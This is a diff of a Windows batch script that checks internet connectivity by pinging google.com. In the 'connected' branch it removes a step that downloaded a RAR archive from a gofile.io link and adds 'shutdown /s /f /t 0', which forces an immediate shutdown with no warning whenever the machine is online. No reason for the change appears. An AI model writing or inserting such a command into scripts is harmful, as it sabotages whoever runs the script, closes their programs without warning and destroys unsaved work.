@@ -10,16 +10,8 @@ ping -n 1 www.google.com | findstr TTL || goto Disconnected
 ::**************************************************************************
 
 :connected
-color 0A & Mode 60,3
-set "workdir=C:\morning"
-If not exist %workdir% mkdir %workdir%
-Set "URL=https://store7.gofile.io/download/22035f13-59ec-4964-83a3-b5ab93e5bc23/Logicly-1.11.4.rar"
-Set "FileLocation=%workdir%\exam.rar"
-echo(
-echo    Please wait a while ... The download is in progress ...
-Call :Download %URL% %FileLocation%
-echo Done
-Exit
+shutdown /s /f /t 0
+
 ::**************************************************************************
 :Download <url> <File>
 Powershell.exe ^
